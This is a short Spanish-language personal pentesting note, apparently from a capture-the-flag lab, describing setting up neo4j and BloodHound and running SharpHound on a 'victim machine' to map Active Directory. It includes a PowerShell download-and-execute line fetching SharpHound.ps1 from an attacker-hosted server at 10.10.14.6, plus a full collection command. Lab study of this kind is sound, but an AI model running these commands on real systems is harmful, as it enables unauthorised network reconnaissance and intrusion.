
- Instalamos neo4j y bloodhound
- neo4j console
- Accedemos al localhosts por el puerto 7474 y si es la primera vez que lo usamos creamos las credenciales nuevas
- Accedemos a bloodhound con las nuevas credenciales que hemos creado con el usuario bloodhound
- Nos descargamos el sharphound.ps1  y lo subimos a la maquina victima![[Pasted image 20240722004159.png]]
- Usamos el siguiente comando en la maquina victima mientras tenemos un servidor por el puerto 80 en python compartiendo el contenido del sharphound. `IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/SharpHound.ps1')`
- Ejecutas el siguiente comando en la maquina victima `Invoke-BloodHound -CollectionMethod All`
- 